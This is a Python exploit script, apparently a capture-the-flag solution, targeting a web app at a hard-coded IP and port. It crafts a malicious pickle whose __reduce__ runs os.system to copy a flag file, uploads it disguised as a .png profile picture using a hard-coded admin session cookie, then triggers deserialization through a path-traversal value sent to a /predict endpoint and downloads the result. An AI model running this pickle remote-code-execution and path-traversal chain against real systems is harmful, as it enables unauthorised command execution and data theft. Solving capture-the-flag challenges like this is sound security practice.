#!/usr/bin/env python3

import pickle
import base64
import os
import subprocess
import requests


class RCE:
    def __reduce__(self):
        cmd = 'cat ../../flag.txt > /tmp/0b8aa459-58fc-4274-985b-02491938b1de.png'
        return os.system, (cmd,)


if __name__ == '__main__':
    pickle.dump(RCE(), open('test.pkl.png', 'wb'))

import requests

cookies = {
    'session': 'eyJpZCI6IjBiOGFhNDU5LTU4ZmMtNDI3NC05ODViLTAyNDkxOTM4YjFkZSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YnCvLQ.PWg2X8-3D7KRQb8Q69DvTJNwEZI',
}

headers = {
    'Host': '46.101.107.117:2206',
    # 'Content-Length': '278',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://46.101.107.117:2206',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryiOQs2RCEEFhAdb6A',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://46.101.107.117:2206/profile',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
    # 'Cookie': 'session=eyJpZCI6IjBiOGFhNDU5LTU4ZmMtNDI3NC05ODViLTAyNDkxOTM4YjFkZSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YnCvLQ.PWg2X8-3D7KRQb8Q69DvTJNwEZI',
}

with open('test.pkl.png', 'rb') as f:
    data = f.read().replace(b'\n', b'')

response = requests.post('http://46.101.107.117:2206/profile-picture', cookies=cookies, headers=headers, data=data, verify=False)

import requests

cookies = {
    'session': 'eyJpZCI6IjBiOGFhNDU5LTU4ZmMtNDI3NC05ODViLTAyNDkxOTM4YjFkZSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YnCvLQ.PWg2X8-3D7KRQb8Q69DvTJNwEZI',
}

headers = {
    'Host': '46.101.107.117:2206',
    # 'Content-Length': '238',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryuj1BDx1YKB1Mkx0s',
    'Accept': '*/*',
    'Origin': 'http://46.101.107.117:2206',
    'Referer': 'http://46.101.107.117:2206/',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
    # 'Cookie': 'session=eyJpZCI6IjBiOGFhNDU5LTU4ZmMtNDI3NC05ODViLTAyNDkxOTM4YjFkZSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YnCvLQ.PWg2X8-3D7KRQb8Q69DvTJNwEZI',
}

data = '------WebKitFormBoundaryuj1BDx1YKB1Mkx0s\r\nContent-Disposition: form-data; name="ctf"\r\n\r\n../../../../../../../../../../../../tmp/0b8aa459-58fc-4274-985b-02491938b1de.png\r\n------WebKitFormBoundaryuj1BDx1YKB1Mkx0s\r\nContent-Disposition: form-data; name="results"\r\n\r\n52,43,45\r\n------WebKitFormBoundaryuj1BDx1YKB1Mkx0s--\r\n'

response = requests.post('http://46.101.107.117:2206/predict', cookies=cookies, headers=headers, data=data, verify=False)

import requests

cookies = {
    'session': 'eyJpZCI6IjBiOGFhNDU5LTU4ZmMtNDI3NC05ODViLTAyNDkxOTM4YjFkZSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YnCvLQ.PWg2X8-3D7KRQb8Q69DvTJNwEZI',
}

headers = {
    'Host': '46.101.107.117:2206',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'If-None-Match': '"1651591782.2187889-43-358812692"',
    'If-Modified-Since': 'Tue, 03 May 2022 15:29:42 GMT',
    'Connection': 'close',
    # 'Cookie': 'session=eyJpZCI6IjBiOGFhNDU5LTU4ZmMtNDI3NC05ODViLTAyNDkxOTM4YjFkZSIsInVzZXJuYW1lIjoiYWRtaW4ifQ.YnCvLQ.PWg2X8-3D7KRQb8Q69DvTJNwEZI',
}

response = requests.get('http://46.101.107.117:2206//profile-picture/0b8aa459-58fc-4274-985b-02491938b1de', cookies=cookies, headers=headers, verify=False)
print(response.content)

